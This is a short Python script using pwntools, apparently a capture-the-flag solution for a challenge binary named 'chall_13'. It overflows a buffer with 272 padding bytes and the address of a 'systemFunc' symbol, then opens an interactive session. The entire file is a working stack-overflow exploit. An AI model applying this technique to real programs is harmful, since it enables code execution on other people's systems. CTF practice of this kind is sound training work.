# coding: utf-8
from pwn import *
pr = process("./chall_13")
elf = ELF("./chall_13")
payload = b'A' * 272 + p32(elf.sym.systemFunc)
pr.sendline(payload)
pr.interactive()
pr.close()
